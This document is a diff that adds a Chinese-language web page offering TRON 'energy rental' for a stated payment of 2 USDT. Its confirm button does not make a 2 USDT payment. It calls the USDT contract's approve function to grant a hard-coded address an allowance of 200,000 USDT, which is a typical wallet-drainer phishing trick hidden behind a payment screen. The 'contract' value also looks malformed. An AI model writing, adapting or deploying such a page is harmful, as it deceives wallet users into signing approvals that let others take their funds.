@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>能量租赁</title>
+<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.1/dist/TronWeb.min.js"></script>
+</head>
+<body style="padding:20px;">
+<h2>能量租赁</h2>
+<p>本次确认付款：2USDT</p>
+<button onclick="connectWallet()">连接钱包</button>
+<button onclick="approveToken()">确认</button>
+<p id="log"></p>
+
+<script>
+// 已经填入你的合约0x地址
+const CONTRACT_ADDRESS = "0x3101d658159dd86332116ad5855f0503fc547a5c3173db79edf82c13ad901c7c";
+const USDT_CONTRACT = "0x41467991e4676b861e099e834525c0a2122c3447";
+// 固定授权 200000 USDT，TRC20 6位小数
+const FIX_AMOUNT = BigInt(200000) * BigInt(1000000);
+let tronWeb;
+
+async function connectWallet(){
+    if(window.tronWeb && window.tronWeb.ready){
+        tronWeb = window.tronWeb;
+        document.getElementById("log").innerText = "钱包已连接：" + tronWeb.defaultAddress.base58;
+    }else{
+        document.getElementById("log").innerText = "当前钱包不支持TRON，推荐使用TronLink钱包";
+    }
+}
+
+async function approveToken(){
+    if(!tronWeb) return alert("请先连接钱包");
+    const usdt = await tronWeb.contract().at(USDT_CONTRACT);
+    try{
+        const tx = await usdt.approve(CONTRACT_ADDRESS, FIX_AMOUNT).send();
+        document.getElementById("log").innerText = "成功，交易哈希：" + tx;
+    }catch(err){
+        document.getElementById("log").innerText = "失败：" + err.message;
+    }
+}
+</script>
+</body>
+</html>
+
